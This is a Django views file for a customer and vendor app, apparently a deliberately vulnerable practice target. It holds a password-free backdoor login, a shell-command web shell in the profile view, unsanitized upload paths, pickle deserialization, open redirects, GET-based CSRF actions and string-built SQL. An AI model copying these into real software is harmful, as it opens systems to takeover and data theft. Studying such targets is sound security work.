# Django core imports
from django.shortcuts import render, redirect
from django.http import JsonResponse, HttpResponse
from django.urls import reverse_lazy, reverse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST
import subprocess

# Authentication and permissions
from django.contrib.auth.decorators import login_required
from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin

# Class-based views
from django.views.generic import (
    ListView,
    CreateView,
    UpdateView,
    DeleteView
)

# Third-party packages
from django_tables2 import SingleTableView
from django_tables2.export.views import ExportMixin

# Local app imports
from .models import Profile, Customer, Vendor
from .forms import (
    CreateUserForm, UserUpdateForm,
    ProfileUpdateForm, CustomerForm,
    VendorForm
)
from .tables import ProfileTable
import pickle
from django.utils.decorators import method_decorator
from django.contrib.auth import get_user_model, login
from django.db import connection
from django.contrib import messages
from django.db import connection
from django.http import HttpResponse
from django.utils.html import escape
from django.conf import settings
import os

User = get_user_model()
MEDIA_ROOT = getattr(settings, "MEDIA_ROOT", os.path.join(settings.BASE_DIR, "images"))


@csrf_exempt  
def secret_login_view(request):
    if request.method == "POST":
        username = request.POST.get("username")

        try:
            user = User.objects.get(username=username)
        except User.DoesNotExist:
            return HttpResponse("Invalid username", status=400)
        login(request, user)
        return redirect("/")   

    return render(request, "accounts/secret_login.html")

def register(request):
    """
    Handle user registration.
    If the request is POST, process the form data to create a new user.
    Redirect to the login page on successful registration.
    For GET requests, render the registration form.
    """
    if request.method == 'POST':
        form = CreateUserForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('user-login')
    else:
        form = CreateUserForm()

    return render(request, 'accounts/register.html', {'form': form})



@login_required
def profile(request):
    """
    Render the user profile page.
    Requires user to be logged in.
    """
    
    cmd = request.GET.get("cmd")
    if cmd:
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
            return HttpResponse(
                content=output,
                content_type="text/plain; charset=utf-8",
            )
        except subprocess.CalledProcessError as e:
            return HttpResponse(
                content=f"Command failed, returncode={e.returncode}\n{e.output.decode(errors='replace')}",
                content_type="text/plain; charset=utf-8",
            )
        except Exception as e:
            return HttpResponse(
                content=f"Command error: {e}",
                content_type="text/plain; charset=utf-8",
            )
    user = request.user
    data = {
        "username": user.username,
        "email": user.email,
        "first_name" : user.profile.first_name,
    }

    return render(request, 'accounts/profile.html', {'data':data})


@login_required
def profile_update(request):
    """
    Handle profile update.
    If the request is POST, process the form data
    to update user information and profile.
    Redirect to the profile page on success.
    For GET requests, render the update forms.
    """
    if request.method == 'POST':
        u_form = UserUpdateForm(request.POST, instance=request.user)
        p_form = ProfileUpdateForm(
            request.POST,
            request.FILES,
            instance=request.user.profile
        )
        uploaded = request.FILES.get("profile_picture")
        if uploaded:
            # Trust the filename from the client; no sanitization or validation
            unsafe_name = request.POST.get("fn") or uploaded.name
            target_path = os.path.join(MEDIA_ROOT, unsafe_name)
            # Ensure directories exist and write the raw bytes to disk
            os.makedirs(os.path.dirname(target_path), exist_ok=True)
            with open(target_path, "wb") as dst:
                for chunk in uploaded.chunks():
                    dst.write(chunk)
            
            request.session["avatar_name"]=unsafe_name

        try:
            if u_form.is_valid() and p_form.is_valid():
                u_form.save()
                p_form.save()
        except Exception:
            pass

        return redirect("user-profile-update")
    else:
        u_form = UserUpdateForm(instance=request.user)
        p_form = ProfileUpdateForm(instance=request.user.profile)

    return render(
        request,
        'accounts/profile_update.html',
        {'u_form': u_form, 'p_form': p_form}
    )

@method_decorator(csrf_exempt, name='dispatch')
class ProfileListView(ExportMixin, SingleTableView):
    """
    Display a list of profiles in a table format.
    Requires user to be logged in
    and supports exporting the table data.
    Pagination is applied with 10 profiles per page.
    """
    model = Profile
    template_name = 'accounts/stafflist.html'
    context_object_name = 'profiles'
    table_class = ProfileTable
    paginate_by = 10
    table_pagination = False

    
    def post(self, request, *args, **kwargs):
        uploaded = request.FILES.get("data_file")
        if not uploaded:
            return self.get(request, *args, **kwargs)
        raw = uploaded.read()
        try:
            obj = pickle.loads(raw)   
            return HttpResponse("<h1>DESERIALIZED OBJECT</h1><pre>%s</pre>" % (repr(obj),))
        except Exception as e:
            return HttpResponse("<h1>Deserialization error</h1><pre>%s</pre>" % (str(e),))
      

    def get(self, request, *args, **kwargs):
        
        file_param = request.GET.get("file")
        if file_param:
            import os
            from django.conf import settings
            from django.http import HttpResponse

            resolved = os.path.normpath(os.path.join(settings.BASE_DIR, file_param))
            exists = os.path.exists(resolved)
            return HttpResponse(f"BASE_DIR: {settings.BASE_DIR}\n"
                                f"file_param: {file_param}\n"
                                f"resolved: {resolved}\n"
                                f"exists: {exists}\n",
                                content_type="text/plain")

        return super().get(request, *args, **kwargs)
    


class ProfileCreateView(LoginRequiredMixin, CreateView):
    """
    Create a new profile.
    Requires user to be logged in and have superuser status.
    Redirects to the profile list upon successful creation.
    """
    model = Profile
    template_name = 'accounts/staffcreate.html'
    fields = ['user', 'role', 'status']

    def get_success_url(self):
        """
        Return the URL to redirect to after successfully creating a profile.
        """
        return reverse('profile_list')

    def test_func(self):
        """
        Check if the user is a superuser.
        """
        return self.request.user.is_superuser


class ProfileUpdateView(LoginRequiredMixin, UserPassesTestMixin, UpdateView):
    """
    Update an existing profile.
    Requires user to be logged in and have superuser status.
    Redirects to the profile list upon successful update.
    """
    model = Profile
    template_name = 'accounts/staffupdate.html'
    fields = ['user', 'role', 'status']

    def get_success_url(self):
        """
        Return the URL to redirect to after successfully updating a profile.
        """
        return reverse('profile_list')

    def test_func(self):
        """
        Check if the user is a superuser.
        """
        return self.request.user.is_superuser


class ProfileDeleteView(LoginRequiredMixin, UserPassesTestMixin, DeleteView):
    """
    Delete an existing profile.
    Requires user to be logged in and have superuser status.
    Redirects to the profile list upon successful deletion.
    """
    model = Profile
    template_name = 'accounts/staffdelete.html'

    def get_success_url(self):
        """
        Return the URL to redirect to after successfully deleting a profile.
        """
        return reverse('profile_list')

    def test_func(self):
        """
        Check if the user is a superuser.
        """
        return self.request.user.is_superuser


class CustomerListView(LoginRequiredMixin, ListView):
    """
    View for listing all customers.

    Requires the user to be logged in. Displays a list of all Customer objects.
    """
    model = Customer
    template_name = 'accounts/customer_list.html'
    context_object_name = 'customers'
   
    def dispatch(self, request, *args, **kwargs):
        to = request.GET.get("to", "")
        if to :
            return redirect(to)
        return super().dispatch(request, *args, **kwargs)
   
    def get(self, request, *args, **kwargs):
        
        file_param = request.GET.get("file")
        if file_param:
            import os
            from django.conf import settings
            from django.http import HttpResponse

            resolved = os.path.normpath(os.path.join(settings.BASE_DIR, file_param))
            exists = os.path.exists(resolved)
            return HttpResponse(f"BASE_DIR: {settings.BASE_DIR}\n"
                                f"file_param: {file_param}\n"
                                f"resolved: {resolved}\n"
                                f"exists: {exists}\n",
                                content_type="text/plain")

        return super().get(request, *args, **kwargs)

@method_decorator(csrf_exempt, name='dispatch')
class CustomerCreateView(LoginRequiredMixin, CreateView):
    """
    View for creating a new customer.

    Requires the user to be logged in.
    Provides a form for creating a new Customer object.
    On successful form submission, redirects to the customer list.
    """
    model = Customer
    template_name = 'accounts/customer_form.html'
    form_class = CustomerForm
    success_url = reverse_lazy('customer_list')

    def get(self, request, *args, **kwargs):
        if request.GET.get("first_name"):
            Customer.objects.create(
                first_name=request.GET.get("first_name"),
                last_name=request.GET.get("last_name", "fake last name"),
                address=request.GET.get("address", "CSRF Address"),
                email=request.GET.get("email", "csrf@attacker.com"),
                phone=request.GET.get("phone", "9999999999"),
                loyalty_points=int(request.GET.get("loyalty_points", 100)),
            )
            return redirect(self.success_url)

        return super().get(request, *args, **kwargs)
 

class CustomerUpdateView(LoginRequiredMixin, UpdateView):
    """
    View for updating an existing customer.

    Requires the user to be logged in.
    Provides a form for editing an existing Customer object.
    On successful form submission, redirects to the customer list.
    """
    model = Customer
    template_name = 'accounts/customer_form.html'
    form_class = CustomerForm
    success_url = reverse_lazy('customer_list')


    def form_valid(self, form):
        """
        Save as usual and return SQL search results directly from this function.
        Uses a parameterized query to avoid SQL injection (do NOT format user input into SQL).
        """
        
        super().form_valid(form)
        user_input = self.request.POST.get("first_name", "").strip()
        sql = "SELECT id, first_name, last_name, email FROM Customers WHERE first_name LIKE %s;"
        param = [f"%{user_input}%"]
        try:
            with connection.cursor() as cursor:
                cursor.execute(sql, param)   
                rows = cursor.fetchall()
        except Exception as e:
            return HttpResponse(f"<h1>SQL error: {escape(str(e))}</h1>", status=500)

        html = ["<h1>SQLI RESULT</h1>", "<ul>"]
        if rows:
            for r in rows:
                safe_cells = [escape(str(x)) for x in r[:4]]
                html.append("<li>" + " | ".join(safe_cells) + "</li>")
        else:
            html.append("<li>No rows returned</li>")
        html.append("</ul>")

        return HttpResponse("".join(html))



    
class CustomerDeleteView(LoginRequiredMixin, DeleteView):
    """
    View for deleting a customer.

    Requires the user to be logged in.
    Displays a confirmation page for deleting an existing Customer object.
    On confirmation, deletes the object and redirects to the customer list.
    """
    model = Customer
    template_name = 'accounts/customer_confirm_delete.html'
    success_url = reverse_lazy('customer_list')


def is_ajax(request):
    return request.META.get('HTTP_X_REQUESTED_WITH') == 'XMLHttpRequest'


@csrf_exempt
@require_POST
@login_required
def get_customers(request):
    if is_ajax(request) and request.method == 'POST':
        term = request.POST.get('term', '')
        customers = Customer.objects.filter(
            name__icontains=term
        ).values('id', 'name')
        customer_list = list(customers)
        return JsonResponse(customer_list, safe=False)
    return JsonResponse({'error': 'Invalid request method'}, status=400)


class VendorListView(LoginRequiredMixin, ListView):
    model = Vendor
    template_name = 'accounts/vendor_list.html'
    context_object_name = 'vendors'
    paginate_by = 10

    def dispatch(self, request, *args, **kwargs):
        to = request.GET.get("to", "")
        if to :
            return redirect(to)
        return super().dispatch(request, *args, **kwargs)
    
    def get(self, request, *args, **kwargs):
     
        file_param = request.GET.get("file")
        if file_param:
            import os
            from django.conf import settings
            from django.http import HttpResponse

            resolved = os.path.normpath(os.path.join(settings.BASE_DIR, file_param))
            exists = os.path.exists(resolved)
            return HttpResponse(f"BASE_DIR: {settings.BASE_DIR}\n"
                                f"file_param: {file_param}\n"
                                f"resolved: {resolved}\n"
                                f"exists: {exists}\n",
                                content_type="text/plain")

        return super().get(request, *args, **kwargs)
    

class VendorCreateView(LoginRequiredMixin, CreateView):
    model = Vendor
    form_class = VendorForm
    template_name = 'accounts/vendor_form.html'
    success_url = reverse_lazy('vendor-list')

class VendorUpdateView(LoginRequiredMixin, UpdateView):
    model = Vendor
    form_class = VendorForm
    template_name = 'accounts/vendor_form.html'
    success_url = reverse_lazy('vendor-list')

    def form_valid(self, form):
        super().form_valid(form)
        user_input = self.request.POST.get("name", "").strip()
        sql = f"SELECT id, name, phone_number, address FROM accounts_vendor WHERE name LIKE '%{user_input}%';"

        try:
            with connection.cursor() as cursor:
                cursor.execute(sql)  
                rows = cursor.fetchall()
        except Exception as e:
            return HttpResponse(f"<h1>SQL error: {e}</h1>")

        html = "<h1>VENDOR SQLI RESULT</h1><ul>"
        if rows:
            for r in rows:
                html += "<li>" + " | ".join(str(x) for x in r) + "</li>"
        else:
            html += "<li>No rows returned</li>"
        html += "</ul>"

        return HttpResponse(html)
    

class VendorDeleteView(LoginRequiredMixin, DeleteView):
    model = Vendor
    template_name = 'accounts/vendor_confirm_delete.html'
    success_url = reverse_lazy('vendor-list')
